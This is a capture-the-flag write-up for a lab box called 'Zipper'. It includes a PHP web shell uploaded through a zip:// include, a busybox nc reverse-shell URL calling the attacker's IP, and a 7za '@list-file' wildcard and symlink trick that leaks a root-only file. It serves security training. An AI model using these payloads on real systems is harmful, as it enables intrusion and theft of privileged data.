+++
date = '2026-04-30T10:12:33+09:00'
draft = false
title = 'Zipper'
description = "Zipper writeup - Linux exploitation walkthrough covering PHP zip wrapper abuse for initial access and privilege escalation through a vulnerable 7za backup cron job."
tags = ["zip", "7za", "7z", "php-wrapper"]
+++

# Port scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Only SSH and HTTP are exposed. Since the web service is the most interesting attack surface, I started there.

# Initial foothold

## Web enumeration

Accessing the web page reveals a simple application with a file upload function.

![mainpage](/images/zipper/zipper.png)

After uploading a test file, I noticed that the application stores uploaded archives under the `uploads` directory with a generated filename such as `upload_1777450472.zip`.

The application also accepts a `file` parameter and includes the requested file. Because the uploaded content remains inside a ZIP archive, I tested PHP's `zip://` stream wrapper to include a file from inside the archive.

I created a small PHP web shell named `zipper`:

```php
<?php system($_GET['cmd']); ?>
```

Then I uploaded it.

The file can be reached through the ZIP wrapper by using the uploaded ZIP path and the internal filename. The `#` separator must be URL-encoded as `%23`.

```
http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&cmd=id
```

![zip](/images/zipper/zip.png)

After confirming command execution, I used `busybox nc` to catch a reverse shell.

```
http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&cmd=busybox%20nc%20192.168.45.156%204444%20-e%20sh
```

# Privilege escalation

After getting a shell as `www-data`, I transferred and ran `pspy` to look for scheduled tasks. A root-owned cron job was executing `/opt/backup.sh`.

```
2026/04/29 08:25:01 CMD: UID=0     PID=5107   | bash /opt/backup.sh 
2026/04/29 08:25:01 CMD: UID=0     PID=5106   | /bin/sh -c    bash /opt/backup.sh 
```

The script contains the following logic:

```sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

The vulnerable part is the `*.zip` wildcard passed directly to `7za`. The `7za` utility supports list files through the `@filename` syntax. If a file named `@root.zip` exists in the working directory, `7za` treats `root.zip` as a list file instead of a normal archive.

Since `/var/www/html/uploads` is writable by `www-data`, I created a list-file trigger and pointed `root.zip` to `/root/proof.txt`.

```sh
touch @root.zip
ln -s /root/proof.txt root.zip
```

When the cron job runs, the shell expands `*.zip`, and `7za` processes `@root.zip`. This causes `7za` to read the symlinked `/root/proof.txt` as a list file. Each line from the root-only file is interpreted as a path to archive.

Those interpreted paths do not exist, so `7za` writes warnings to `/opt/backups/backup.log`. Because the warnings include the missing "filenames", the contents of `/root/proof.txt` are leaked into the log.

```sh
www-data@zipper:/var/www/html/uploads$ cat /opt/backups/backup.log 

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7413 24-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 2136343

Scanning the drive:
21 files, 2133135 bytes (2084 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 21


Files read from disk: 21
Archive size: 2136498 bytes (2087 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
c4c57ccc78b351703407139d38347cee : No more files
```

The root flag is exposed in the backup log.
